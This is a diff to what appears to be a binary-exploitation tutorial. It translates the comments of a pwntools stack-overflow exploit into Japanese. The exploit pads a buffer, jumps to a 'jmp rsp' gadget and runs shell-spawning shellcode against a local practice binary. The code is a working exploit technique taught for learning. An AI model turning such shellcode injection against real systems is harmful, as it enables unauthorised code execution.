@@ -43,14 +43,14 @@ from pwn import *
 elf = context.binary = ELF('./vuln')
 p = process()
 
-# we use elf.search() because we don't need those instructions directly,
-# just anu sequence of \xff\xe4
+# elf.search() を使うのは、その命令そのものは必要なく、
+# \xff\xe4 というバイト列があればよいため
 jmp_rsp = next(elf.search(asm('jmp rsp')))
 
 payload = flat(
-    'A' * 120,                # padding
-    jmp_rsp,                 # RSP will be pointing to shellcode, so we jump there
-    asm(shellcraft.sh())     # place the shellcode
+    'A' * 120,                # パディング
+    jmp_rsp,                 # RSP はシェルコードを指しているので、そこへジャンプする
+    asm(shellcraft.sh())     # シェルコードを置く
 )
 
 p.sendlineafter('RSP!\n', payload)
@@ -106,7 +106,7 @@ payload += p64(jmp_rsp)
 payload += asm('''
     sub rsp, 128;
     jmp rsp;
-''')        # 128 we found with r2
+''')        # 128 は r2 で見つけた値
 
 p.sendlineafter('RSP!\n', payload)
 p.interactive()
